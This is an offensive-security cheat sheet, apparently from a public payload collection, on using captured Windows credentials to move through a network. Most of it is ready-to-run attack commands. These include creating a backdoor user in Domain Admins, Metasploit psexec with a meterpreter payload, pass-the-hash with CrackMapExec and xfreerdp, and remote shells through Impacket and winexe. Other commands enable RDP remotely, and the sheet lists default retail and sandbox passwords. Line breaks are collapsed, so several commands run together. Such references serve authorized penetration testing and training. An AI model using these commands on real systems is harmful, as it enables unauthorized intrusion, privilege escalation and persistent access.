# Windows - Using credentials

# Windows - Using credentials

## Summary

- [TIPS](about:blank#tips)
    - [TIP 1 - Create your credential](about:blank#tip-1-create-your-credential)
    - [TIP 2 - Retail Credential](about:blank#tip-2-retail-credential)
    - [TIP 3 - Sandbox Credential - WDAGUtilityAccount](about:blank#tip-3-sandbox-credrential-wdagutilityaccount)
- [Metasploit](about:blank#metasploit)
    - [Metasploit - SMB](about:blank#metasploit-smb)
    - [Metasploit - Psexec](about:blank#metasploit-psexec)
- [Crackmapexec](about:blank#crackmapexec)
- [Winexe](about:blank#winexe)
- [Psexec.py / Smbexec.py / Wmiexec.py](about:blank#psexec.py---smbexec.py---wmiexec.py)
- [PsExec - Sysinternal](about:blank#psexec-sysinternal)
- [RDP Remote Desktop Protocol](about:blank#rdp-remote-desktop-protocol)
- [Netuse](about:blank#netuse)
- [Runas](about:blank#runas)

## TIPS

### TIP 1 - Create your credential

    net user hacker hacker1234* /addnet localgroup administrators hacker /addnet localgroup "Remote Desktop Users" hacker /add # RDP accessnet localgroup "Backup Operators" hacker /add # Full access to filesnet group "Domain Admins" hacker /add /domain

Some info about your user

    net user /domnet user /domain

### TIP 2 - Retail Credential

Retail Credential [@m8urnett on Twitter](https://twitter.com/m8urnett/status/1003835660380172289)

when you run Windows in retail demo mode, it creates a user named Darrin DeYoung and an admin RetailAdmin

    Username: RetailAdminPassword: trs10

### TIP 3 - Sandbox Credential - WDAGUtilityAccount

WDAGUtilityAccount - [@never_released on Twitter](https://twitter.com/never_released/status/1081569133844676608)

Starting with Windows 10 version 1709 (Fall Creators Update), it is part of Windows Defender Application Guard

    \\windowssandboxUsername: wdagutilityaccountPassword: pw123

## Metasploit

### Metasploit - SMB

    use auxiliary/scanner/smb/smb_loginset SMBDomain DOMAINset SMBUser usernameset SMBPass passwordservices -p 445 -Rruncreds

### Metasploit - Psexec

Note: the password can be replaced by a hash to execute a `pass the hash` attack.

    use exploit/windows/smb/psexecset RHOST 10.2.0.3set SMBUser usernameset SMBPass passwordset PAYLOAD windows/meterpreter/bind_tcprunshell

## Crackmapexec

    git clone https://github.com/byt3bl33d3r/CrackMapExec.githubpython crackmapexec.py 10.9.122.0/25 -d DOMAIN -u username -p passwordpython crackmapexec.py 10.10.10.10 -d DOMAIN -u username -p password -x whoami# pass the hashcme smb 172.16.157.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:5509de4ff0a6eed7048d9f4a61100e51' --local-auth

## Winexe

Integrated to Kali

    winexe -U DOMAIN/username%password //10.10.10.10 cmd.exe

## Psexec.py / Smbexec.py / Wmiexec.py

from Impacket

    git clone https://github.com/CoreSecurity/impacket.gitpython psexec.py DOMAIN/username:password@10.10.10.10python smbexec.py DOMAIN/username:password@10.10.10.10python wmiexec.py DOMAIN/username:password@10.10.10.10# psexec.exe -s cmd# switch admin user to NT Authority/System

## PsExec - Sysinternal

from Windows - [Sysinternal](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)

    PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exePsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe -s  # get System shell

## RDP Remote Desktop Protocol

    python rdpcheck.py DOMAIN/username:password@10.10.10.10rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/mysharerdesktop -u username -p password -g 70 -r disk:share=/tmp/myshare 10.10.10.10# -g : the screen will take up 70% of your actual screen size# -r disk:share : sharing a local folder during a remote desktop session

Note: you may need to enable it with the following command

    reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /fnetsh firewall set service remoteadmin enablenetsh firewall set service remotedesktop enable

or with psexec(sysinternals)

    psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0

or with crackmapexec

    crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable

or with Metasploit

    run getgui -u admin -p 1234

Then log in using xfreerdp

    xfreerdp /u:offsec /d:win2012 /pth:88a405e17c0aa5debbc9b5679753939d /v:10.0.0.1 # pass the hash works for Server 2012 R2 / Win 8.1+xfreerdp -u test -p 36374BD2767773A2DD4F6B010EC5EE0D 192.168.226.129 # pass the hash using Restricted Admin, need an admin account not in the "Remote Desktop Users" group.xfreerd /u:runner /v:10.0.0.1 # password will be asked

## Netuse

Windows only

    net use \\ordws01.cscou.lab /user:DOMAIN\username passwordC$

## Runas

    runas /netonly /user:DOMAIN\username "cmd.exe"runas /noprofil /netonly /user:DOMAIN\username cmd.exe

## References

- [Ropnop - Using credentials to own Windows boxes](https://blog.ropnop.com/using-credentials-to-own-windows-boxes/)
- [Ropnop - Using credentials to own Windows boxes Part 2](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [Gaining Domain Admin from Outside Active Directory](https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html)